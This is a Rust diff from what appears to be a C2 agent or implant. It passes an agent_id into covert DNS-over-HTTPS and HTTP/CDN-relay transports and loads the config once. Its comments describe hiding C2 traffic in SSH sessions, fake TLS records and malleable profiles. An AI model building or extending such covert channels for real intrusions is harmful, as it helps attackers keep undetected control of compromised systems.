@@ -175,14 +175,18 @@ pub async fn build_outbound_transport(
     addr: &str,
     secret: &str,
     cert_fp: Option<&str>,
+    agent_id: &str,
 ) -> Result<Box<dyn Transport + Send>> {
+    // Load config once; shared by the covert-transport selection block below
+    // and the traffic_profile assignment in the TLS fallback path.
+    let config_result = crate::config::load_config();
     #[cfg(any(
         feature = "ssh-transport",
         feature = "doh-transport",
         feature = "http-transport"
     ))]
     {
-        match crate::config::load_config() {
+        match config_result.as_ref() {
             Ok(cfg) => {
                 // SSH transport: tunnel C2 messages through an SSH session
                 // channel.  Highest priority because SSH blends in with
@@ -226,7 +230,7 @@ pub async fn build_outbound_transport(
                     );
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
-                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session)
+                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session, agent_id.to_string())
                             .await
                             .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
                     ));
@@ -241,7 +245,7 @@ pub async fn build_outbound_transport(
                     info!("http-transport: cdn_relay=true; switching to HttpTransport");
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
-                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session)
+                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session, agent_id.to_string())
                             .await
                             .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
                     ));
@@ -286,7 +290,7 @@ pub async fn build_outbound_transport(
     // When `traffic_profile = "tls"` the raw ciphertext is additionally wrapped
     // in fake TLS 1.2 application-data records by NormalizedTransport; the
     // real outer TLS already provides confidentiality and authentication.
-    let traffic_profile = crate::config::load_config()
+    let traffic_profile = config_result
         .map(|c| c.traffic_profile)
         .unwrap_or_default();
 
@@ -373,7 +377,7 @@ async fn connect_once(
     agent_id: &str,
     cert_fp: Option<&str>,
 ) -> Result<()> {
-    let transport = build_outbound_transport(addr, secret, cert_fp).await?;
+    let transport = build_outbound_transport(addr, secret, cert_fp, agent_id).await?;
     run_with_heartbeat(transport, agent_id).await
 }
 
